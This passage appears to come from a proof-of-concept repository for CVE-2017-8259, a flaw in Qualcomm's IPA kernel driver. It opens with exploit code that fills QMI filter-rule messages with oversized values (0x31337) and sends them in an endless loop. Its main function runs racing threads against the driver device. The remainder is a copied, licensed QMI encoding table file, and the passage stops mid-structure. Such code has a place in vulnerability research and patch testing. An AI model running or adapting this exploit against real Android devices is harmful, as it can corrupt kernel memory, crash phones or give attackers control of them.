		req_msg->filter_spec_list[i].filter_rule.num_offset_meq_32 = 1;
		req_msg->filter_spec_list[i].filter_rule.tc_eq_present = 1;
		req_msg->filter_spec_list[i].filter_rule.tc_eq = 1;
		req_msg->filter_spec_list[i].filter_rule.flow_eq_present = 1 ;
	}
	req_msg->source_pipe_index_valid = 1;
	req_msg->source_pipe_index = 0x031337;
	req_msg->num_ipv4_filters_valid = 1;
	req_msg->filter_spec_ex_list_valid = 1;
	req_msg->filter_spec_ex_list_len = 0x31337;

	resp_desc.msg_id = QMI_IPA_INSTALL_FILTER_RULE_REQ_V01;
	resp_desc.max_msg_len = QMI_IPA_INSTALL_FILTER_RULE_REQ_MAX_MSG_LEN_V01;
	resp_desc.ei_array = ipa_install_fltr_rule_req_msg_data_v01_ei;
	fd = socket(AF_MSM_IPC, SOCK_DGRAM, 0);
	if (fd < 0) {
		printf("Couldn't open socket %s\n", strerror(errno));
		//h return;
	}

	int ret = qmi_kernel_encode(&resp_desc, io.iov_base + sizeof(*hdr),
				    QMI_IPA_INSTALL_FILTER_RULE_REQ_MAX_MSG_LEN_V01,
				    req_msg);
	if (ret < 0) {
		printf("qmi_kernel_encode failed \n");
	}
	printf("\n STARTING DECODE\n");
	//qmi_kernel_decode(&resp_desc, req_msg, io.iov_base + sizeof(*hdr),
	//		  QMI_IPA_INSTALL_FILTER_RULE_REQ_MAX_MSG_LEN_V01);
	while (true) {
		sendmsg(fd, &msg, MSG_CMSG_CLOEXEC);
		usleep(500000);
	}


}

int main(void)
{


	pthread_t race_car;
	pthread_t race_car1;
	pthread_t race_car2;
	pthread_t race_car3;
	int fd;
	unsigned long i = 0;
	//struct ipa_install_fltr_rule_req_msg_v01 msg = { 0xFF };
	//struct ipa_install_fltr_rule_req_msg_v01 *rule_req = &msg;
	//struct wan_ioctl_set_tether_client_pipe msg;
	struct ipa_fltr_installed_notif_req_msg_v01 msg;
	srand(150);

	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Failed to open %s with %s\n", dev, strerror(errno));
		return EXIT_FAILURE;
	}

	//pthread_create(&race_car3, NULL, try_socket, NULL);
	pthread_create(&race_car, NULL, flt_rule, &fd);
	pthread_create(&race_car1, NULL, flt_rule_index, &fd);
	pthread_create(&race_car2, NULL, tether_stats, &fd);

	sleep(600);
}

```

`CVE-2017-8259/ipa_qmi_service_v01.c`:

```c
/* Copyright (c) 2013-2015, The Linux Foundation. All rights reserved.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 and
 * only version 2 as published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 */

#include "qmi_encdec.h"

/* Type Definitions  */
static struct elem_info ipa_hdr_tbl_info_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_hdr_tbl_info_type_v01,
					modem_offset_start),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_hdr_tbl_info_type_v01,
					modem_offset_end),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_route_tbl_info_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_route_tbl_info_type_v01,
					route_tbl_start_addr),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_route_tbl_info_type_v01,
					num_indices),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_modem_mem_info_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_modem_mem_info_type_v01,
					block_start_addr),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_modem_mem_info_type_v01,
					size),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_hdr_proc_ctx_tbl_info_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_hdr_proc_ctx_tbl_info_type_v01,
			modem_offset_start),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_hdr_proc_ctx_tbl_info_type_v01,
			modem_offset_end),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_zip_tbl_info_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_zip_tbl_info_type_v01,
					modem_offset_start),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_zip_tbl_info_type_v01,
					modem_offset_end),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_ipfltr_range_eq_16_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_range_eq_16_type_v01,
			offset),
	},
	{
		.data_type	= QMI_UNSIGNED_2_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint16_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_range_eq_16_type_v01,
			range_low),
	},
	{
		.data_type	= QMI_UNSIGNED_2_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint16_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_range_eq_16_type_v01,
			range_high),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_ipfltr_mask_eq_32_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
				struct ipa_ipfltr_mask_eq_32_type_v01,
				offset),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
				struct ipa_ipfltr_mask_eq_32_type_v01,
				mask),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_mask_eq_32_type_v01,
			value),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_ipfltr_eq_16_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_eq_16_type_v01,
			offset),
	},
	{
		.data_type	= QMI_UNSIGNED_2_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint16_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_ipfltr_eq_16_type_v01,
					value),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_ipfltr_eq_32_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_ipfltr_eq_32_type_v01,
					offset),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_ipfltr_eq_32_type_v01,
					value),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_ipfltr_mask_eq_128_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_mask_eq_128_type_v01,
			offset),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 16,
		.elem_size	= sizeof(uint8_t),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_mask_eq_128_type_v01,
			mask),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 16,
		.elem_size	= sizeof(uint8_t),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_mask_eq_128_type_v01,
			value),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_filter_rule_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_2_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint16_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_filter_rule_type_v01,
			rule_eq_bitmap),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_filter_rule_type_v01,
			tos_eq_present),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					tos_eq),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					protocol_eq_present),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					protocol_eq),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					num_ihl_offset_range_16),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_IPFLTR_NUM_IHL_RANGE_16_EQNS_V01,
		.elem_size	= sizeof(
			struct ipa_ipfltr_range_eq_16_type_v01),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_range_16),
		.ei_array	= ipa_ipfltr_range_eq_16_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					num_offset_meq_32),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_IPFLTR_NUM_MEQ_32_EQNS_V01,
		.elem_size	= sizeof(struct ipa_ipfltr_mask_eq_32_type_v01),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					offset_meq_32),
		.ei_array	= ipa_ipfltr_mask_eq_32_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					tc_eq_present),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					tc_eq),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					flow_eq_present),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					flow_eq),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_eq_16_present),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_ipfltr_eq_16_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_eq_16),
		.ei_array	= ipa_ipfltr_eq_16_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_eq_32_present),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_ipfltr_eq_32_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_eq_32),
		.ei_array	= ipa_ipfltr_eq_32_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					num_ihl_offset_meq_32),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_IPFLTR_NUM_IHL_MEQ_32_EQNS_V01,
		.elem_size	= sizeof(struct ipa_ipfltr_mask_eq_32_type_v01),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_meq_32),
		.ei_array	= ipa_ipfltr_mask_eq_32_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					num_offset_meq_128),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	=
			QMI_IPA_IPFLTR_NUM_MEQ_128_EQNS_V01,
		.elem_size	= sizeof(
			struct ipa_ipfltr_mask_eq_128_type_v01),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_filter_rule_type_v01,
			offset_meq_128),
		.ei_array	= ipa_ipfltr_mask_eq_128_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					metadata_meq32_present),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_ipfltr_mask_eq_32_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					metadata_meq32),
		.ei_array	= ipa_ipfltr_mask_eq_32_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ipv4_frag_eq_present),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_filter_spec_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_spec_type_v01,
					filter_spec_identifier),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_spec_type_v01,
					ip_type),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_filter_rule_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_spec_type_v01,
					filter_rule),
		.ei_array	= ipa_filter_rule_type_data_v01_ei,
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_spec_type_v01,
					filter_action),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_spec_type_v01,
					is_routing_table_index_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_spec_type_v01,
					route_table_index),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_spec_type_v01,
					is_mux_id_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_spec_type_v01,
					mux_id),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info
	ipa_filter_rule_identifier_to_handle_map_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_filter_rule_identifier_to_handle_map_v01,
			filter_spec_identifier),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_filter_rule_identifier_to_handle_map_v01,
			filter_handle),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_filter_handle_to_index_map_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_filter_handle_to_index_map_v01,
			filter_handle),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_filter_handle_to_index_map_v01,
			filter_index),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_init_modem_driver_req_msg_data_v01_ei[] = {
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			platform_type_valid),
	},
	{
		.data_type	= QMI_SIGNED_4_BYTE_ENUM,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x10,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			platform_type),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			hdr_tbl_info_valid),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_hdr_tbl_info_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x11,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			hdr_tbl_info),
		.ei_array	= ipa_hdr_tbl_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			v4_route_tbl_info_valid),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_route_tbl_info_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x12,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			v4_route_tbl_info),
		.ei_array	= ipa_route_tbl_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			v6_route_tbl_info_valid),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_route_tbl_info_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x13,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			v6_route_tbl_info),
		.ei_array	= ipa_route_tbl_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x14,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			v4_filter_tbl_start_addr_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x14,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			v4_filter_tbl_start_addr),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x15,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			v6_filter_tbl_start_addr_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x15,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			v6_filter_tbl_start_addr),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x16,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			modem_mem_info_valid),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_modem_mem_info_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x16,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			modem_mem_info),
		.ei_array	= ipa_modem_mem_info_type_data_v01_ei,
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x17,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			ctrl_comm_dest_end_pt_valid),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x17,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
			ctrl_comm_dest_end_pt),
	},
	{
		.data_type	= QMI_OPT_FLAG,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= 0x18,
		.offset		= offsetof(
			struct ipa_init_modem_driver_req_msg_v01,
